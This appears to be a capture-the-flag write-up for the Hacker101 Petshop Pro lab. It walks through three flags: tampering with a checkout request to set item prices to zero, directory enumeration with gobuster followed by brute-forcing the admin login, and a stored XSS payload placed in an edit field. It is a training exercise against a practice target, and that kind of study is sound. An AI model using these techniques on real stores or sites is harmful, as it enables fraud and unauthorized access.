
## flag 1
>Something looks out of place with checkout<br>
 It's always nice to get free stuff


add anything to the cart, then check out while intercepting the request
![image](https://github.com/0xbazooka/Hacker101/assets/99322823/2b4b40ba-e0af-4474-8efd-683525f43d07)


the "cart" parameter is URL-encoded ,and it contains two elements: a list of items and their corresponding quantities in the shopping cart
change the price to 0
`[[0, {"name": "Kitten", "desc": "8\"x10\" color glossy photograph of a kitten.", "logo": "kitten.jpg", "price": 0}], [0, {"name": "Kitten", "desc": "8\"x10\" color glossy photograph of a kitten.", "logo": "kitten.jpg", "price": 0}]]`

et voila !

![image](https://github.com/0xbazooka/Hacker101/assets/99322823/80593713-7714-4dbe-9683-619563100db1)

<br><br><br>
## flag 2
>There must be a way to administer the app<br>
>Tools may help you find the entrypoint<br>
>Tools are also great for finding credentials<br>


run any directory enumeration tool you like, I used gobuster 

```
gobuster dir -u https://3b71fd43f1fb10e3401857b7bf59ed00.ctf.hacker101.com/  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o petshop.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://3b71fd43f1fb10e3401857b7bf59ed00.ctf.hacker101.com/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/07/18 16:10:54 Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 329]
/static               (Status: 301) [Size: 169] [--> http://3b71fd43f1fb10e3401857b7bf59ed00.ctf.hacker101.com/static/]                                                                                                                   
/cart                 (Status: 200) [Size: 410]
/edit                 (Status: 400) [Size: 167]
/checkout             (Status: 405) [Size: 153]
Progress: 32776 / 220561 (14.86%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/07/18 16:31:52 Finished
===============================================================
```

found an admin login page at /login

using burp intruder to guess each of the username:

![image](https://github.com/0xbazooka/Hacker101/assets/99322823/82fd430e-660d-485f-b37c-a5bf3735b319)

and the pass:

![image](https://github.com/0xbazooka/Hacker101/assets/99322823/69e12bc9-230a-4213-8ece-c05d7fdd6576)

trying them in the login page, it redirects us to the admin page and we get the flag.
![image](https://github.com/0xbazooka/Hacker101/assets/99322823/28b2b376-be38-4b44-9b71-675e32de9c68)

<br><br><br>
## flag 3
>Always test every input
Bugs don't always appear in a place where the data is entered

edit one of the posts

tried xss payload `<img src=x onerror="alert(1)">` in the name field, save then go back to the cart and the flag is there

![image](https://github.com/0xbazooka/Hacker101/assets/99322823/863a9099-8fca-44c2-8d99-5ba19c0b07f6)


